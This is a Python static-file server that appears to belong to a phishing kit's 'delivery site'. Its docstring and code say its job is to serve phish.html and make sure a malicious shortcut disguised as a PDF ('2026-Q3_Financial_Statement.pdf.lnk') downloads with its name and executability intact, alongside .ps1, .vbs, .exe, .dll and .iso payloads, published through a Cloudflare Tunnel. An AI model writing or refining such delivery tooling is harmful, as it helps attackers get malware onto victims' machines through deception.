#!/usr/bin/env python3
"""serve.py - loopback static server for the Outlook_Addin delivery site.

Replaces `python3 -m http.server` so downloads keep their exact file names.

Why: Chromium appends ".download" to Blob downloads whose MIME type has no
extension mapping (application/octet-stream + .lnk), which breaks the file name
and makes the .lnk non-executable. delivery/phish.html now delivers the .lnk
with a plain same-origin anchor, and this server pins the name with
Content-Disposition: attachment; filename="...", so the browser saves the file
exactly as it is on disk (e.g. 2026-Q3_Financial_Statement.pdf.lnk).

Usage:
    python3 scripts/serve.py [PORT] [DIR]

Binds 127.0.0.1 only - the site is meant to be reached through the Cloudflare
Tunnel (scripts/cf_tunnel.sh), never directly.
"""
import os
import sys
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

# Extensions that must always be downloaded, never rendered inline.
ATTACHMENT_EXTS = {".lnk", ".hex", ".ps1", ".bin", ".zip", ".iso", ".vbs", ".exe", ".dll"}

# Explicit MIME map: anything not listed falls back to
# application/octet-stream so the browser never sniffs a .lnk/.hex/.bin as
# text or HTML.
MIME_MAP = {
    ".html": "text/html; charset=utf-8",
    ".htm": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "text/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif": "image/gif",
    ".ico": "image/x-icon",
    ".txt": "text/plain; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".ps1": "text/plain; charset=utf-8",
    ".lnk": "application/octet-stream",
    ".vbs": "application/octet-stream",
    ".exe": "application/octet-stream",
    ".hex": "application/octet-stream",
    ".bin": "application/octet-stream",
    ".dll": "application/octet-stream",
    ".zip": "application/zip",
    ".iso": "application/octet-stream",
}


class DeliveryHandler(SimpleHTTPRequestHandler):
    extensions_map = MIME_MAP

    def end_headers(self):
        # Pin the download name server-side. The anchor's `download` attribute
        # in phish.html is only a hint; this header is what the browser trusts.
        path = self.translate_path(self.path)
        if os.path.isfile(path) and os.path.splitext(path)[1].lower() in ATTACHMENT_EXTS:
            name = os.path.basename(path)
            self.send_header("Content-Disposition", 'attachment; filename="%s"' % name)
        super().end_headers()

    def log_message(self, fmt, *args):
        sys.stderr.write("[serve] %s - %s\n" % (self.address_string(), fmt % args))


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    directory = os.path.abspath(sys.argv[2]) if len(sys.argv) > 2 else os.path.abspath("dist")
    os.chdir(directory)
    handler = partial(DeliveryHandler, directory=directory)
    httpd = ThreadingHTTPServer(("127.0.0.1", port), handler)
    print("[*] serving %s on http://127.0.0.1:%d (loopback only)" % (directory, port))
    print("[*] publish it with: bash scripts/cf_tunnel.sh")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
